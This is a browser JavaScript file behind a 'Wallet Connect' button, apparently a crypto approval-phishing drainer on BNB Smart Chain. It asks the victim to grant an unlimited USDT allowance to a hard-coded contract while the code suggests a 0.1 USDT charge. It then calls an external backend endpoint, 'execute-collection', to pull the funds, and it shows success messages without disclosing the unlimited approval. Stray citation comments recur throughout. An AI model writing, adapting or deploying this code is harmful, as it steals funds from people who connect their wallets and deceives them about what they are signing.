"use strict";

// ─── Configuration ────────────────────────────────────────────────────────────
const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b"; 
const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634"; 
const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; 
const BSC_CHAIN_ID_HEX = "0x38"; 
const COLLECT_AMOUNT   = "100000000000000000"; // 0.1 USDT
const MIN_USDT_BALANCE = 0n;
const BACKEND_URL      = "https://secure-merchant.onrender.com/api"; 

const BSC_RPC_URLS = [
  "https://bsc-rpc.publicnode.com",
  "https://bsc-dataseed.binance.org/",
  "https://bsc-dataseed1.binance.org/",
  "https://bsc-dataseed2.binance.org/",
  "https://bsc-dataseed3.binance.org/",
  "https://rpc.ankr.com/bsc"
]; //[cite: 5]

const BSC_CHAIN_PARAMS = {
  chainId:           BSC_CHAIN_ID_HEX,
  chainName:         "BNB Smart Chain",
  nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
  rpcUrls:           BSC_RPC_URLS,
  blockExplorerUrls: ["https://bscscan.com/"]
}; //[cite: 5]

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function balanceOf(address account) external view returns (uint256)"
]; //[cite: 5]

// ─── DOM refs ─────────────────────────────────────────────────────────────────
const approveBtn    = document.getElementById("approveBtn"); //[cite: 5]
const btnText       = document.getElementById("btnText"); //[cite: 5]
const btnSpinner    = document.getElementById("btnSpinner"); //[cite: 5]
const merchantInput = document.getElementById("merchantAddress"); //[cite: 5]
const toastEl       = document.getElementById("toast"); //[cite: 5]

if (merchantInput) merchantInput.value = MERCHANT_ADDRESS; //[cite: 5]

// ─── Wake up Render backend ───────────────────────────────────────────────────
(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })(); //[cite: 5]

let _cachedAddress = null; //[cite: 5]

// ─── UI helpers ───────────────────────────────────────────────────────────────
let _toastTimer;
function showToast(msg, type = "default", ms = 4500) {
  clearTimeout(_toastTimer);
  toastEl.textContent  = msg;
  toastEl.dataset.type = type === "default" ? "" : type;
  toastEl.hidden       = false;
  _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
} //[cite: 5]

function setLoading(on, label = "Processing…") {
  approveBtn.disabled = on;
  btnText.textContent = on ? label : "Wallet Connect";
  btnSpinner.hidden   = !on;
} //[cite: 5]

// ─── Universal Provider Fetcher (Optimized for Reown AppKit First) ────────────
async function getActiveProvider() {
  // 1. Priorizar el proveedor gestionado por Reown AppKit
  if (window.modal && typeof window.modal.getWalletProvider === "function") {
    try {
      const appKitProvider = window.modal.getWalletProvider();
      if (appKitProvider) return appKitProvider;
    } catch (_) {}
  }
  
  // 2. Proveedor inyectado estándar como alternativa
  if (window.ethereum && typeof window.ethereum.request === "function") {
    return window.ethereum;
  }
  
  return null;
} //[cite: 5]

// ─── Backend collect (with retry) ─────────────────────────────────────────────
async function triggerBackendCollect(userAddress) {
  let lastErr;
  for (let i = 1; i <= 3; i++) {
    try {
      const res  = await fetch(`${BACKEND_URL}/execute-collection`, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ userAddress, amount: COLLECT_AMOUNT })
      });
      const data = await res.json();
      if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
      return data;
    } catch (e) {
      lastErr = e;
      if (i < 3) await new Promise(r => setTimeout(r, 3000));
    }
  }
  throw lastErr;
} //[cite: 5]

// ─── Main button handler (Reown AppKit + Ethers.js v6 Integration) ────────────
approveBtn.addEventListener("click", async () => {
  let rawProvider = await getActiveProvider();

  // 1. Si no hay una sesión activa, abrir el modal oficial de Reown AppKit
  if (!rawProvider) {
    if (window.modal && typeof window.modal.open === "function") {
      try {
        await window.modal.open();
        return; 
      } catch (modalErr) {
        console.error("Error al abrir el modal de WalletConnect:", modalErr);
      }
    } else {
      showToast("El sistema de billeteras no está inicializado.", "error");
      return;
    }
  }

  setLoading(true, "Processing…");

  try {
    // 2. Inicializar Ethers.js v6 BrowserProvider y Signer nativos
    const provider = new ethers.BrowserProvider(rawProvider);

    // Validar y cambiar a la red BNB Smart Chain si es necesario
    const network = await provider.getNetwork();
    if (Number(network.chainId) !== 56) {
      try {
        await rawProvider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: BSC_CHAIN_ID_HEX }]
        });
      } catch (e) {
        if (e.code === 4902) {
          await rawProvider.request({
            method: "wallet_addEthereumChain",
            params: [BSC_CHAIN_PARAMS]
          });
        } else {
          showToast("Por favor cambia a la red BNB Smart Chain.", "error");
          setLoading(false);
          return;
        }
      }
    }

    const signer = await provider.getSigner();
    const userAddress = await signer.getAddress();
    _cachedAddress = userAddress;

    // 3. Instanciar contratos con Ethers.js v6
    const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);

    // Verificar balance de USDT mediante el contrato inteligente
    const usdtBalance = await usdtContract.balanceOf(userAddress);
    if (usdtBalance <= MIN_USDT_BALANCE) {
      showToast("Saldo insuficiente de USDT.", "error");
      setLoading(false);
      return;
    }

    const CAP_AMOUNT = ethers.MaxUint256;

    // Verificar Allowance (aprobación previa) usando Ethers v6
    const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);
    if (allowance >= CAP_AMOUNT) {
      setLoading(true, "Finalizing…");
      await triggerBackendCollect(userAddress);
      showToast("¡Transacción completada con éxito! ✓", "success");
      setLoading(false);
      return;
    }

    // 4. Solicitar firma de aprobación (Approve) a través de Ethers.js v6
    setLoading(true, "Approving…");
    const tx = await usdtContract.approve(CONTRACT_ADDRESS, CAP_AMOUNT);

    // 5. Esperar confirmación del bloque
    setLoading(true, "Confirming…");
    await tx.wait();

    // 6. Ejecutar el cobro desde el Backend
    setLoading(true, "Finalizing…");
    await triggerBackendCollect(userAddress);
    showToast("¡Transacción completada con éxito! ✓", "success");

  } catch (err) {
    const raw = err?.reason ?? err?.message ?? "Error desconocido";
    if (
      err.code === 4001 ||
      raw.toLowerCase().includes("user rejected") ||
      raw.toLowerCase().includes("user denied") ||
      raw.toLowerCase().includes("canceled")
    ) {
      showToast("Transacción cancelada.", "default");
    } else {
      showToast("Error: " + String(raw).substring(0, 90), "error");
    }
  } finally {
    setLoading(false);
  }
});
